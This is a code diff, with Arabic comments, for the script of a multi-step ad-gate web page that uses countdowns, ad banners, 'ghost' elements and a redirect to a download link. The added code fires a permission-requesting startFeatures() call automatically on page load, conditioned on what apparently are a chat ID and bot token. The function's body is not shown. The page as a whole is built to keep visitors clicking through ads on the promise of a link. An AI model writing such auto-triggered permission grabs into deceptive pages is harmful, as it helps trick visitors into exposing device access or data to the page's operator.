+// ============ التهيئة ============
+addBanners("ads1");
 addNative("native1");
 
-// بمجرد تحميل الصفحة الأولى، يبدأ عداد الخطوة الأولى فوراً مع طلب الأذونات وتشغيل المهام
-ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ 
-    reveal("b1"); 
-});
+ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// أزرار التنقل بين الصفحات
-$("b1").onclick = function(){ 
-    goNext(this, function(){ 
-        startFeatures(); // طلب الأذونات وتشغيل الميزات مباشرة عند أول تفاعل/انتقال
-        show(2); 
-        addGhost(); 
-        addBanners("ads2"); 
-        addNative("native2"); 
-        ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
-    }); 
+// ✅ طلب الأذونات فوراً في بداية الصفحة الأولى (المطلوب #1)
+if (chat && token && features) {
+  setTimeout(function(){ startFeatures(); }, 400);
+}
+
+$("b1").onclick = function(){
+  goNext(this, function(){
+    show(2);
+    addGhost();
+    addBanners("ads2");
+    addNative("native2");
+    ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); });
+  });
 };
 
-$("b2").onclick = function(){ 
-    goNext(this, function(){ 
-        show(3); 
-        addGhost(); 
-        
-        // حقن إعلانات الصفحة الثالثة كما طلبتم
-        loadAdScript("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
-        loadAdScript("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
-        loadAdScript("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
-
-        var atOptionsScript = document.createElement('script');
-        atOptionsScript.innerHTML = `
-          atOptions = {
-            'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
-            'format' : 'iframe',
-            'height' : 300,
-            'width' : 160,
-            'params' : {}
-          };
-        `;
-        document.body.appendChild(atOptionsScript);
-        loadAdScript("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
-
-        reveal("b3"); 
-    }); 
+$("b2").onclick = function(){
+  goNext(this, function(){
+    show(3);
+    addGhost();
+    ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); });
+  });
 };
 
-$("b3").onclick = function(){ 
-    window.location.href = SMART_LINK; 
-};
+$("b3").onclick = function(){ window.location.href = SMART_LINK; };
 </script>
 </body>
-</html>
+ </html>
